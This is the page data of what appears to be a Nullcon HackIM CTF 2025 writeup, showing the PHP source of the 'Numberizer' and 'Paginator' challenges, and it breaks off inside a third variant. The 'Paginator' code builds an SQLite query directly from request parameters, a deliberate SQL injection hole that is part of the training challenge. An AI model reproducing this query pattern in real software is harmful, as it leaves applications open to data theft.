2:I[55329,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],""]
3:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],"PostMeta"]
4:"$Sreact.suspense"
6:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],"LikeButton"]
7:I[5613,[],""]
9:I[31778,[],""]
a:I[89806,["250","static/chunks/250-0ef8476c0fa8ee24.js","372","static/chunks/372-15c56d21d8e8e229.js","993","static/chunks/app/(posts)/layout-6e6c57aef3ee92cf.js"],""]
b:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-71de1b4a5090c7d9.js"],"GlobalProvider"]
c:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-71de1b4a5090c7d9.js"],""]
8:["slug","25a/wp-nullcon-hackim-2025","c"]
0:["nyIOWxxv2Hb1zcxcPyrwk",[[["",{"children":["(posts)",{"children":[["slug","25a/wp-nullcon-hackim-2025","c"],{"children":["__PAGE__?{\"slug\":[\"25a\",\"wp-nullcon-hackim-2025\"]}",{}]}]}]},"$undefined","$undefined",true],["",{"children":["(posts)",{"children":[["slug","25a/wp-nullcon-hackim-2025","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],false,["$","h1",null,{"className":"x-post-title","children":"Nullcon HackIM CTF 2025 Writeup"}],["$","$L3",null,{"path":"/25a/wp-nullcon-hackim-2025/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}],["$","$L6",null,{"path":"/25a/wp-nullcon-hackim-2025/"}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/717a90e5599f6ea4.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","div",null,{"id":"post-layout","children":[["$","div",null,{"id":"main","className":"center-wrapper","children":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":null}]}],["$","$La",null,{}]]}],null]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$Lb",null,{"children":[["$","$Lc",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","code",null,{"id":"notfound-404","children":"404"}],["$","code",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/98e601cf5ba3633d.css","precedence":"next","crossOrigin":""}]],"styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/95b9a222519ec85f.css","precedence":"next","crossOrigin":""}]]}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/4682f1d53f08c69e.css","precedence":"next","crossOrigin":""}]],"$Ld"]]]]
e:I[62029,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-29ee5e4b02f3cf98.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-29b9c18639a2a38e.js"],""]
f:T515,<?php
ini_set("error_reporting", 0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$MAX_NUMS = 5;

if(isset($_POST['numbers']) && is_array($_POST['numbers'])) {

    $numbers = array();
    $sum = 0;
    for($i = 0; $i < $MAX_NUMS; $i++) {
        if(!isset($_POST['numbers'][$i]) || strlen($_POST['numbers'][$i])>4 || !is_numeric($_POST['numbers'][$i])) {
            continue;
        }
        $the_number = intval($_POST['numbers'][$i]);
        if($the_number < 0) {
            continue;
        }
        $numbers[] = $the_number;
    }
    $sum = intval(array_sum($numbers));


    if($sum < 0) {
        echo "You win a flag: $FLAG";
    } else {
        echo "You win nothing with number $sum ! :-(";
    }
}
?>

<html>
    <head>
        <title>Numberizer</title>
    </head>
    <body>
        <h1>Numberizer</h1>
        <form action="/" method="post">
            <label for="numbers">Give me at most 10 numbers to sum!</label><br>
            <?php
            for($i = 0; $i < $MAX_NUMS; $i++) {
                echo '<input type="text" name="numbers[]"><br>';
            }
            ?>
            <button type="submit">Submit</button>
        </form>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
10:T3316,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error_reporting"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token variable">$MAX_NUMS</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'numbers'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'numbers'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token variable">$numbers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sum</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$MAX_NUMS</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'numbers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'numbers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">4</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'numbers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$the_number</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'numbers'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$the_number</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$numbers</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$the_number</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$sum</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">array_sum</span><span class="token punctuation">(</span><span class="token variable">$numbers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$sum</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You win a flag: <span class="token interpolation"><span class="token variable">$FLAG</span></span>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You win nothing with number <span class="token interpolation"><span class="token variable">$sum</span></span> ! :-("</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Numberizer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Numberizer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>numbers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Give me at most 10 numbers to sum!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
            <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$MAX_NUMS</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;input type="text" name="numbers[]">&lt;br>'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token delimiter important">?></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Submit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>To view the source code, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/?source<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>click here.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
11:T90e,<?php
ini_set("error_reporting", 0);
ini_set("display_errors",0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$db = new SQLite3('/tmp/db.db');
try {
$db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
$db->exec("INSERT INTO pages (title, content) VALUES ('Flag', '" . base64_encode($FLAG) . "')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} catch(Exception $e) {
//var_dump($e);
}


if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
[$min, $max] = explode(",",$_GET['p']);
if(intval($min) <= 1 ) {
    die("This post is not accessible...");
}
try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        echo $row['title'] . " (ID=". $row['id'] . ") has content: " . $row['content'] . "<br>";
    }
}catch(Exception $e) {
    echo "Try harder!";
}
} else {
    echo "Try harder!";
}
?>

<html>
    <head>
        <title>Paginator</title>
    </head>
    <body>
        <h1>Paginator</h1>
        <a href="/?p=2,10">Show me pages 2-10</a>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
12:T3d5b,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error_reporting"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/tmp/db.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Flag', '"</span> <span class="token operator">.</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$FLAG</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token comment">//var_dump($e);</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">[</span><span class="token variable">$min</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$min</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This post is not accessible..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token variable">$q</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM pages WHERE id >= <span class="token interpolation"><span class="token variable">$min</span></span> AND id &lt;= <span class="token interpolation"><span class="token variable">$max</span></span>"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token constant">SQLITE3_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" (ID="</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">") has content: "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Paginator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Paginator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/?p=2,10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Show me pages 2-10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>To view the source code, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/?source<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>click here.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
13:T8d8,<?php
ini_set("error_reporting", 1);
ini_set("display_errors",1);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php"; // Now the juicy part is hidden away! $db = new SQLite3('/tmp/db.db');

try{
$db->exec("CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')");
